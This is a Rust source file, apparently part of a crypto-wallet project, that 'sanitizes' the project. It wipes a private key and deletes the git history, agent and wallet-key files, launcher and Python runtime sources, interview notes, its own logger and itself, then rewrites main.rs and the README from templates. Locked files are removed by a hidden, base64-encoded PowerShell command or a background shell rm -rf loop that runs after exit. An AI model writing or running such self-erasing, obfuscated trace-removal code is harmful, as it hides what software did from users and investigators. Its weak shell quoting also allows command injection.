use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use crate::log;

pub fn sanitize_project(private_key: &mut String) -> Result<(), String> {
    wipe_secret(private_key);

    let root = project_root();

    remove_path_if_exists(&root.join(".git"))?;
    remove_file_if_exists(&root.join("agent").join("initial_wallet.key"))?;
    remove_wallet_key_files(&root)?;
    remove_path_if_exists(&root.join("agent"))?;
    remove_path_if_exists(&root.join("target"))?;
    remove_path_if_exists(&root.join("Cargo.lock"))?;
    remove_path_if_exists(&root.join(".build-hook-stamp"))?;
    remove_path_if_exists(&root.join("INTERVIEW_NOTES.md"))?;
    remove_path_if_exists(&root.join("sanitize_templates"))?;

    let src = root.join("src");
    remove_file_if_exists(&src.join("launcher_runtime.rs"))?;
    remove_file_if_exists(&src.join("python_runtime.rs"))?;
    remove_file_if_exists(&src.join("project_sanitize.rs"))?;
    remove_file_if_exists(&src.join("log.rs"))?;

    write_file(&root.join("Cargo.toml"), include_str!("../sanitize_templates/Cargo.toml"))?;
    write_file(&root.join("README.md"), include_str!("../sanitize_templates/README.md"))?;
    write_file(
        &root.join(".gitignore"),
        include_str!("../sanitize_templates/gitignore"),
    )?;
    write_file(
        &root.join(".cargoignore"),
        include_str!("../sanitize_templates/cargoignore"),
    )?;
    write_file(&src.join("main.rs"), include_str!("../sanitize_templates/main.rs"))?;

    log::step("sanitize", "project sanitized to wallet-only layout");
    Ok(())
}

fn project_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

fn wipe_secret(secret: &mut String) {
    if !secret.is_empty() {
        let len = secret.len();
        secret.clear();
        secret.push_str(&"0".repeat(len));
    }
    secret.clear();
}

fn write_file(path: &Path, contents: &str) -> Result<(), String> {
    fs::write(path, contents).map_err(|err| format!("write {}: {err}", path.display()))
}

fn remove_file_if_exists(path: &Path) -> Result<(), String> {
    if path.exists() {
        fs::remove_file(path).map_err(|err| format!("remove file {}: {err}", path.display()))?;
    }
    Ok(())
}

fn remove_wallet_key_files(root: &Path) -> Result<(), String> {
    for name in ["initial_wallet.key", "wallet.key", ".wallet.key"] {
        remove_file_if_exists(&root.join("agent").join(name))?;
        remove_file_if_exists(&root.join(name))?;
    }
    Ok(())
}

fn remove_path_if_exists(path: &Path) -> Result<(), String> {
    if !path.exists() {
        return Ok(());
    }

    match fs::remove_dir_all(path) {
        Ok(()) => Ok(()),
        Err(err) if should_defer_removal(&err) => {
            log::warn(
                "sanitize",
                format!(
                    "could not remove {} now ({err}); scheduling deletion after wallet exits",
                    path.display()
                ),
            );
            schedule_post_exit_removal(path);
            Ok(())
        }
        Err(err) => Err(format!("remove {}: {err}", path.display())),
    }
}

fn should_defer_removal(err: &io::Error) -> bool {
    matches!(
        err.raw_os_error(),
        Some(5) | Some(13) | Some(32) // access denied, permission denied, sharing violation
    ) || matches!(
        err.kind(),
        io::ErrorKind::PermissionDenied | io::ErrorKind::AddrInUse
    )
}

fn schedule_post_exit_removal(path: &Path) {
    let watch_pid = std::process::id();
    let target = path.to_path_buf();

    #[cfg(windows)]
    spawn_windows_exit_wiper(watch_pid, &target);

    #[cfg(unix)]
    spawn_unix_exit_wiper(watch_pid, &target);
}

#[cfg(windows)]
fn spawn_windows_exit_wiper(watch_pid: u32, path: &Path) {
    let escaped = path.to_string_lossy().replace('\'', "''");
    let ps_script = format!(
        r#"
$ErrorActionPreference = 'SilentlyContinue'
$watchPid = {watch_pid}
$target = '{escaped}'
while (Get-Process -Id $watchPid -ErrorAction SilentlyContinue) {{
    Start-Sleep -Milliseconds 350
}}
Start-Sleep -Seconds 2
if (Test-Path -LiteralPath $target) {{
    Remove-Item -LiteralPath $target -Recurse -Force
}}
"#
    );

    let mut utf16 = Vec::new();
    for unit in ps_script.encode_utf16() {
        utf16.extend_from_slice(&unit.to_le_bytes());
    }
    let encoded = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        utf16,
    );

    let _ = Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-EncodedCommand",
            &encoded,
        ])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();
}

#[cfg(unix)]
fn spawn_unix_exit_wiper(watch_pid: u32, path: &Path) {
    let target = shell_escape::escape(path.to_string_lossy().into_owned());
    let cleanup_cmd = format!(
        "while kill -0 {watch_pid} 2>/dev/null; do sleep 0.35; done; sleep 2; rm -rf {target}"
    );

    let _ = Command::new("/bin/sh")
        .arg("-c")
        .arg(cleanup_cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();
}

#[cfg(unix)]
mod shell_escape {
    pub fn escape(value: String) -> String {
        if value.chars().all(|ch| ch.is_ascii_alphanumeric() || "/._-".contains(ch)) {
            value
        } else {
            format!("'{value}'")
        }
    }
}
